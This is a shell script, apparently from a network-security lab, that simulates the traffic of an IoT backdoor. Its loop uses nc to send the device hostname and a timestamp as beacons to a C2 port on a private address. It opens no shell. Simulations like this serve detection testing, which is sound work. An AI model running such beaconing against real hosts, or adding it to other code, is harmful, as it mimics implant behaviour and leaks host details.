#!/bin/sh
# IoT Backdoor simulation — reproduces the NETWORK signature of an implanted
# backdoor on a home device: periodic connect-back "beacons" to a C2 listener.
# This is traffic-pattern only: it opens NO shell and grants NO remote control.
echo "[IOT-BACKDOOR] Starting..."
TARGET="${TARGET_HOST:-172.20.0.10}"
INTENSITY="${INTENSITY:-medium}"
DURATION="${DURATION:-60}"
C2_PORT="${C2_PORT:-9001}"
END=$(($(date +%s) + DURATION))

# Intensity -> beacon interval (seconds); lower = chattier backdoor
case "$INTENSITY" in
    low)    INTERVAL=10 ;;
    high)   INTERVAL=2 ;;
    *)      INTERVAL=5 ;;  # medium
esac

while [ $(date +%s) -lt $END ]; do
    # Small keep-alive beacon to the C2 port (no interactive shell)
    printf 'BEACON host=%s uptime=%s\n' "$(hostname)" "$(date +%s)" \
        | nc -w 2 "$TARGET" "$C2_PORT" 2>/dev/null
    sleep "$INTERVAL"
done
echo "[IOT-BACKDOOR] Done."
